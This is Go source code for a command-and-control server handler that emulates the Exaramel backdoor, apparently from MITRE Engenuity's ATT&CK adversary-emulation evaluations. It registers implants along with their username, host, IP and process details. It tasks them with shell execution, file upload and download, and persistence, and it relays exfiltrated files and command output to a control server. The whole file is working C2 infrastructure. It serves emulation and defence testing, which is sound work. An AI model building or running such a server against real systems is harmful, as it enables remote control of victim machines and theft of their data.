package exaramel

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"attackevals.mitre-engenuity.org/control_server/logger"
	"attackevals.mitre-engenuity.org/control_server/sessions"
	"attackevals.mitre-engenuity.org/control_server/sslcerts"
	"github.com/google/shlex"
	"github.com/gorilla/mux"
)

var RestAPIaddress = ""
var Server *http.Server

var currTaskId uint32 = 0

type TaskType int

// Only IO and OS command types are implemented.
const (
	AppDelete TaskType = iota
	AppSetServer
	AppSetProxy
	AppSetTimeout
	AppUpdate
	AppPersist
	AppDeletePersistence
	IOReadFile
	IOWriteFile
	OSShellExecute
)

func (t TaskType) String() string {
	switch t {
	case AppDelete:
		return "App.Delete"
	case AppSetServer:
		return "App.SetServer"
	case AppSetProxy:
		return "App.SetProxy"
	case AppSetTimeout:
		return "App.SetTimeout"
	case AppUpdate:
		return "App.Update"
	case AppPersist:
		return "App.Persist"
	case AppDeletePersistence:
		return "App.DeletePersistence"
	case IOReadFile:
		return "IO.ReadFile"
	case IOWriteFile:
		return "IO.WriteFile"
	case OSShellExecute:
		return "OS.ShellExecute"
	default:
		return "Error"
	}
}

// Parsing tasking from command line into the specific command types.
func ParseTask(task string) TaskType {
	var ttype TaskType
	command_words := strings.SplitN(task, " ", 2)
	switch command_words[0] {
	case "exec":
		ttype = OSShellExecute
	case "put":
		ttype = IOWriteFile
	case "get":
		ttype = IOReadFile
	case "persist":
		ttype = AppPersist
	case "deletePersistence":
		ttype = AppDeletePersistence
	default:
		return -1
	}
	return ttype
}

// Task state is used to identify complete and incomplete tasks.
type TaskState int

const (
	Incomplete TaskState = iota
	Complete
)

type TaskInfo struct {
	GUID   string
	Method TaskType
	Args   string
	State  TaskState
}

// Data structure to hold assigned tasks with task IDs and types
// guid -> task_id -> TaskInfo
var AgentTasks = make(map[string]map[uint32]TaskInfo)

// Start handler with a /api/v1 URL, and setup endpoints.
func StartHandler(listenAddress, restAddress string, certFile string, keyFile string) {

	logger.Info("Starting Exaramel Handler")

	// make sure we know the REST API address
	RestAPIaddress = restAddress

	// initialize URL router
	urlRouter := mux.NewRouter()
	apiRouter := urlRouter.PathPrefix("/api/v1").Subrouter()

	Server = &http.Server{
		Addr:         listenAddress,
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
		Handler:      urlRouter,
	}

	// bind HTTP routes to their functions
	apiRouter.HandleFunc("/auth/app", RegisterImplant).Methods("POST")
	apiRouter.HandleFunc("/tasks.get/{guid}", GetTask).Methods("GET")
	apiRouter.HandleFunc("/tasks.report/", PostTaskOutput).Methods("POST")
	apiRouter.HandleFunc("/attachment.get/{guid}/{task_id}", GetFileFromServer).Methods("GET")

	needToGenCert := sslcerts.CheckCert(certFile, keyFile)
	if needToGenCert {
		certFile, keyFile = sslcerts.GenerateSSLcert("exaramel")
	}

	// start handler in goroutine so it doesn't block
	go func() {
		err := Server.ListenAndServeTLS(certFile, keyFile)
		if err != nil && err.Error() != "http: Server closed" {
			logger.Error(err)
		}
	}()
}

func StopHandler() {
	emptyContext := context.Background()
	Server.Shutdown(emptyContext)
}

// Helper function to return error responses to the client.
func writeError(w http.ResponseWriter, e error) {
	var respErr RespError
	respErr.Error.Code = 1
	respErr.Error.Message = e.Error()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(respErr)
}

// Receive registration beacon from agent and forward relevant information to main control server.
func RegisterImplant(w http.ResponseWriter, r *http.Request) {

	headerContentType := r.Header.Get("Content-Type")
	if headerContentType != "application/x-www-form-urlencoded" {
		err := "content Type not application/x-www-form-urlencoded"
		logger.Error(err)
		writeError(w, errors.New(err))
		return
	}

	r.ParseForm()
	guid := r.FormValue("guid")
	user := r.FormValue("whoami")
	hostname := strings.SplitN(r.FormValue("platform"), " ", 3)[1]
	ip := r.FormValue("ip")
	pid, err := strconv.Atoi(r.FormValue("pid"))
	if err != nil {
		logger.Error(err)
	}
	ppid, err := strconv.Atoi(r.FormValue("ppid"))
	if err != nil {
		logger.Error(err)
	}

	dir := r.FormValue("dir")
	logger.Info(fmt.Sprintf("Exaramel handler received auth beacon from %v on %v (%v) in %v with username %v. PID: %v, PPID: %v", guid, hostname, ip, dir, user, pid, ppid))
	var jsonSessionData = sessions.Session{
		GUID:     guid,
		User:     user,
		HostName: hostname,
		IPAddr:   ip,
		PID:      pid,
		PPID:     ppid,
		Dir:      dir,
	}

	marshalledSessionData, err := json.Marshal(jsonSessionData)
	if err != nil {
		logger.Error(err.Error())
		writeError(w, err)
		return
	}

	_, err = forwardRegisterImplant(marshalledSessionData)
	if err != nil {
		logger.Error(err.Error())
		writeError(w, err)
		return
	}
	if _, ok := AgentTasks[guid]; !ok {
		AgentTasks[guid] = make(map[uint32]TaskInfo)
	}
	var respAuth RespAuth
	respAuth.Auth.GUID = guid
	respAuth.Auth.AuthResult = 1
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(respAuth)
}

// Forward agent registration info to control server.
func forwardRegisterImplant(implantData []byte) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/session"

	// initialize HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(implantData))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// execute HTTP POST request and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return "", err
	}
	// read response from REST API
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

// Process tasking request from client.
func GetTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	guid := vars["guid"]

	if _, ok := AgentTasks[guid]; !ok {
		err := fmt.Sprintf("Agent with guid %v not registered yet!", guid)
		logger.Error(err)
		writeError(w, errors.New(err))
		return
	}

	response, err := forwardGetTask(guid)
	if err != nil {
		logger.Error(err.Error())
		writeError(w, err)
		return
	}
	var tasks Tasks
	if response != "" {
		taskInfo := constructTaskInfo(guid, response)
		currTaskId += 1
		logger.Info(fmt.Sprintf("Exaramel handler sending command to %v as taskID %v: %v", guid, currTaskId, response))
		tasks = constructTasks(currTaskId, taskInfo.Method, taskInfo.Args)

		AgentTasks[guid][currTaskId] = taskInfo
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(tasks)
}

// Retrieve arguments for command.
// The first field in a command string is stored in the task's Method instead.
func getCommandArgs(command string) string {
	return strings.SplitN(command, " ", 2)[1]
}

// Constructing an entry into the local TaskInfo structure to maintain data on tasking.
func constructTaskInfo(guid string, command string) TaskInfo {
	var taskInfo TaskInfo
	taskInfo.GUID = guid
	taskInfo.Method = ParseTask(command)
	taskInfo.Args = getCommandArgs(command)
	taskInfo.State = Incomplete
	return taskInfo
}

// Constructing the Tasks response structure to send to the client.
// If the task type is IOWriteFile, that means that the agent only needs to know the third argument.
func constructTasks(taskId uint32, taskType TaskType, commandArgs string) Tasks {
	var tasks Tasks
	var taskResp TaskResponse

	taskResp.ID = taskId
	taskResp.Method = taskType.String()
	if taskType == IOWriteFile || taskType == IOReadFile {
		args, err := shlex.Split(commandArgs)
		if err != nil {
			taskResp.Arguments = commandArgs
		} else {
			if taskType == IOWriteFile {
				taskResp.Arguments = args[1]
			} else {
				taskResp.Arguments = args[0]
			}
		}
	} else {
		taskResp.Arguments = commandArgs
	}
	taskResp.Attachment = 0 // not used
	taskResp.AnswerWait = 0 // When set to non-zero value, os.shellexecute command will be executed in background
	taskResp.DoAsync = 0
	taskResp.AnswerImmediately = 0 // when non-zero, the report will be sent as soon as the task ends
	taskResp.WaitOutputTime = 0

	tasks.Response = []TaskResponse{taskResp}

	return tasks
}

// Getting tasking for the agent from the control server.
func forwardGetTask(guid string) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/task/" + guid
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	sessionData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(sessionData), err
}

// Receiving task output from the client.
// The client uses the same endpoint for posting files to upload and for sending task output.
// This function determines if a file should be read or just output content by
// matching the task ID with the task type stored in the TaskInfo structure.
func PostTaskOutput(w http.ResponseWriter, r *http.Request) {
	err := r.ParseMultipartForm(32 << 20)
	if err != nil {
		logger.Error(err)
		writeError(w, err)
		return
	}
	guid := r.FormValue("guid")
	if _, ok := AgentTasks[guid]; !ok {
		err := fmt.Sprintf("Agent with guid %v not registered yet!", guid)
		logger.Error(err)
		writeError(w, errors.New(err))
		return
	}
	taskIdStr := r.FormValue("task_id")
	taskIdInt, err := strconv.Atoi(taskIdStr)
	if err != nil {
		logger.Error(err)
		writeError(w, err)
		return
	}
	taskInfo := AgentTasks[guid][uint32(taskIdInt)]
	var outputContents string
	var reportsResp Reports
	if taskInfo.Method == IOReadFile {
		err = processFileUpload(r, &taskInfo, taskIdInt)
		if err != nil {
			logger.Error(err)
			writeError(w, err)
			return
		}
	} else {
		outputContents = r.FormValue("file")
		// logger.Info("Entire task report: " + outputContents)
		// var outputContentsSubstr string
		// if len(outputContents) > 80 {
		// 	outputContentsSubstr = string(outputContents[:80])
		// } else {
		// 	outputContentsSubstr = string(outputContents[:])
		// }
		// logger.Info(fmt.Sprintf("Task output for taskID %v: %v", taskIdStr, outputContentsSubstr))
		_, err := forwardPostTaskOutput(guid, outputContents)
		if err != nil {
			logger.Error(err)
			writeError(w, err)
			return
		}
	}

	taskInfo.State = Complete

	reportsResp.Response.ID = guid
	reportsResp.Response.CommandID = uint32(taskIdInt)
	reportsResp.Response.Status = 1
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(reportsResp)
}

// Processes a file upload result from the endpoint.
// If the multipart form does not contain a file upload named "file", then there must have been
// an error during file read on the endpoint.
func processFileUpload(r *http.Request, taskInfo *TaskInfo, taskId int) error {
	file, _, err := r.FormFile("file")
	if err != nil {
		errorMessage := r.FormValue("file")
		if errorMessage != "" {
			logger.Warning("File upload failed, received error message: " + errorMessage)
			if _, err = forwardPostTaskOutput(taskInfo.GUID, errorMessage); err != nil {
				return err
			}
			return nil
		}
		return err
	}
	defer file.Close()
	var outputContents bytes.Buffer
	io.Copy(&outputContents, file)
	var outputContentsSubstr string
	if len(outputContents.Bytes()) > 80 {
		outputContentsSubstr = string(outputContents.Bytes()[:80])
	} else {
		outputContentsSubstr = string(outputContents.Bytes()[:])
	}
	logger.Info(fmt.Sprintf("Task output for taskID %v: %v", strconv.Itoa(taskId), outputContentsSubstr))
	filename, err := getUploadFileName(taskInfo.Args)
	if err != nil {
		return err
	}
	_, err = ForwardPostFileToServer(filename, outputContents.Bytes())
	if err != nil {
		return err
	}
	return nil
}

// Helper function to acquire the filename with which to save the file being uploaded.
// This information was provided in the command line arguments, and is stored in the TaskInfo structure.
func getUploadFileName(args string) (string, error) {
	argsSplit, err := shlex.Split(args)
	if err != nil {
		return "", err
	}
	if len(argsSplit) > 1 {
		return argsSplit[1], nil
	} else {
		return filepath.Base(args), nil
	}
}

// Sending an uploaded file to the control server.
func ForwardPostFileToServer(fileName string, fileData []byte) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/upload/" + fileName
	resp, err := http.Post(url, "application/octet-stream", bytes.NewBuffer(fileData))
	if err != nil {
		return "", err
	}

	result, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(result), err
}

// Sending task output to the control server.
func forwardPostTaskOutput(guid string, output string) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/task/output/" + guid

	// setup HTTP POST request
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(output))
	if err != nil {
		return "", err
	}

	// execute HTTP POST and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	if response.StatusCode != 200 {
		e := fmt.Sprintf("Expected error code 200, got %v", response.StatusCode)
		err = errors.New(e)
		return "", err
	}

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

// Downloading the needed file from the control server to complete the IO.WriteFile command.
// The client sends back a taskID, which is then associated to the specific filename using the TaskInfo structure.
func GetFileFromServer(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	guid := vars["guid"]
	logger.Info("Exaramel handler getting file download request from: " + guid)
	if _, ok := AgentTasks[guid]; !ok {
		err := fmt.Sprintf("Agent with guid %v not registered yet!", guid)
		logger.Error(err)
		writeError(w, errors.New(err))
		return
	}
	taskIdStr := vars["task_id"]
	taskIdInt, err := strconv.Atoi(taskIdStr)
	if err != nil {
		logger.Error(err)
		writeError(w, err)
		return
	}
	taskInfo := AgentTasks[guid][uint32(taskIdInt)]
	if taskInfo.Method != IOWriteFile {
		err := "task ID does not correspond to a IOWriteFile task"
		logger.Error(err)
		writeError(w, errors.New(err))
		return
	}
	logger.Info(fmt.Sprintf("Exaramel handler assigning task download command to %v for taskID %v: %v", guid, taskIdStr, taskInfo))
	args, err := shlex.Split(taskInfo.Args)
	if err != nil {
		logger.Error(err)
		writeError(w, err)
		return
	}
	filename := args[0]

	fileData, err := ForwardGetFileFromServer(filename)
	if err != nil {
		logger.Error(err)
		writeError(w, err)
		return
	}
	fmt.Fprint(w, fileData)
}

// Receiving file from the control server. If the file does not exist, an error response is returned.
func ForwardGetFileFromServer(fileName string) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/files/" + fileName
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != 200 {
		return "", errors.New("server did not return requested file: " + fileName)
	}

	fileData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(fileData), err
}

func HandleInterval(w http.ResponseWriter, r *http.Request) {}

func HandleNextTime(w http.ResponseWriter, r *http.Request) {}
